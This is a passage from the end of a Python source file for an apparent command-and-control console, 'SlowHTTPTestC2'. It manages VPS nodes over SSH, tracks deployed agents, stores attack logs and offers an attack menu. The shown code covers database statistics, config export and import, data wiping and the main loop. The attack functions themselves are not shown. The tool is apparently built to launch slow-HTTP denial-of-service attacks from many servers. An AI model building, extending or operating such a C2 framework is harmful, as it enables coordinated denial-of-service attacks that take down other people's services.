            cursor.execute("SELECT COUNT(*) FROM vps_nodes WHERE status = 'online'")
            online_count = cursor.fetchone()[0]
            
            cursor.execute("SELECT COUNT(*) FROM vps_nodes WHERE agent_deployed = 1")
            agent_count = cursor.fetchone()[0]
        
        print(f"\n{Fore.YELLOW}DATABASE INFORMATION:{Style.RESET_ALL}")
        print(f"Database File: {self.db.db_file}")
        print(f"Total VPS: {vps_count}")
        print(f"Online VPS: {online_count}")
        print(f"VPS with Agents: {agent_count}")
        print(f"Attack Logs: {log_count}")
        print(f"File Size: {os.path.getsize(self.db.db_file) / 1024:.1f} KB")
    
    def export_config(self):
        """Export configuration to JSON"""
        try:
            vps_list = self.db.get_vps_list()
            
            config = {
                'export_time': datetime.now().isoformat(),
                'vps_nodes': []
            }
            
            for vps in vps_list:
                vps_id, name, host, port, username, password, key_file, status, agent_deployed, last_seen, created_at = vps
                
                # Don't export passwords for security
                config['vps_nodes'].append({
                    'name': name,
                    'host': host,
                    'port': port,
                    'username': username,
                    'key_file': key_file,
                    'agent_deployed': bool(agent_deployed)
                })
            
            filename = f"c2_config_export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            
            with open(filename, 'w') as f:
                json.dump(config, f, indent=2)
            
            print(f"{Fore.GREEN}Configuration exported to: {filename}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}Note: Passwords are not exported for security{Style.RESET_ALL}")
            
        except Exception as e:
            print(f"{Fore.RED}Export failed: {e}{Style.RESET_ALL}")
    
    def import_config(self):
        """Import configuration from JSON"""
        filename = input(f"{Fore.WHITE}Enter config file path: {Style.RESET_ALL}").strip()
        
        if not os.path.exists(filename):
            print(f"{Fore.RED}File not found{Style.RESET_ALL}")
            return
        
        try:
            with open(filename, 'r') as f:
                config = json.load(f)
            
            imported = 0
            errors = 0
            
            for vps_config in config.get('vps_nodes', []):
                try:
                    self.db.add_vps(
                        vps_config['name'],
                        vps_config['host'],
                        vps_config['port'],
                        vps_config['username'],
                        None,  # No password in export
                        vps_config.get('key_file')
                    )
                    imported += 1
                except Exception as e:
                    print(f"{Fore.YELLOW}Skipped {vps_config['name']}: {e}{Style.RESET_ALL}")
                    errors += 1
            
            print(f"{Fore.GREEN}Import completed: {imported} imported, {errors} errors{Style.RESET_ALL}")
            
        except Exception as e:
            print(f"{Fore.RED}Import failed: {e}{Style.RESET_ALL}")
    
    def clear_all_data(self):
        """Clear all data from database"""
        print(f"{Fore.RED}{Style.BRIGHT}WARNING: This will delete ALL data!{Style.RESET_ALL}")
        confirm1 = input(f"{Fore.RED}Type 'DELETE' to confirm: {Style.RESET_ALL}")
        
        if confirm1 != 'DELETE':
            print(f"{Fore.YELLOW}Cancelled{Style.RESET_ALL}")
            return
        
        confirm2 = input(f"{Fore.RED}Are you absolutely sure? (yes/no): {Style.RESET_ALL}").lower()
        
        if confirm2 != 'yes':
            print(f"{Fore.YELLOW}Cancelled{Style.RESET_ALL}")
            return
        
        try:
            with sqlite3.connect(self.db.db_file) as conn:
                cursor = conn.cursor()
                cursor.execute("DELETE FROM attack_logs")
                cursor.execute("DELETE FROM vps_nodes")
                conn.commit()
            
            print(f"{Fore.GREEN}All data cleared successfully{Style.RESET_ALL}")
            
        except Exception as e:
            print(f"{Fore.RED}Clear failed: {e}{Style.RESET_ALL}")
    
    def run(self):
        """Main program loop"""
        try:
            while self.running:
                self.print_menu()
                
                choice = input(f"\n{Fore.WHITE}Select option: {Style.RESET_ALL}").strip()
                
                if choice == '1':
                    self.vps_management_menu()
                elif choice == '2':
                    self.attack_menu()
                elif choice == '3':
                    self.monitor_status()
                elif choice == '4':
                    self.view_logs()
                elif choice == '5':
                    self.settings_menu()
                elif choice == '0':
                    print(f"{Fore.CYAN}Shutting down C2 server...{Style.RESET_ALL}")
                    self.running = False
                else:
                    print(f"{Fore.RED}Invalid option{Style.RESET_ALL}")
                    
        except KeyboardInterrupt:
            print(f"\n{Fore.CYAN}C2 server interrupted by user{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}Fatal error: {e}{Style.RESET_ALL}")
        finally:
            # Clean up connections
            for ssh in self.vps_manager.connections.values():
                try:
                    ssh.close()
                except:
                    pass
            
            print(f"{Fore.CYAN}C2 server shutdown complete{Style.RESET_ALL}")


def main():
    """Main entry point"""
    try:
        # Check dependencies
        required_modules = ['paramiko', 'colorama', 'sqlite3']
        missing_modules = []
        
        for module in required_modules:
            try:
                __import__(module)
            except ImportError:
                missing_modules.append(module)
        
        if missing_modules:
            print(f"{Fore.RED}Missing required modules: {', '.join(missing_modules)}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}Install with: pip install {' '.join(missing_modules)}{Style.RESET_ALL}")
            return 1
        
        # Start C2 server
        c2 = SlowHTTPTestC2()
        c2.run()
        
        return 0
        
    except Exception as e:
        print(f"{Fore.RED}Startup error: {e}{Style.RESET_ALL}")
        return 1


if __name__ == "__main__":
    sys.exit(main())
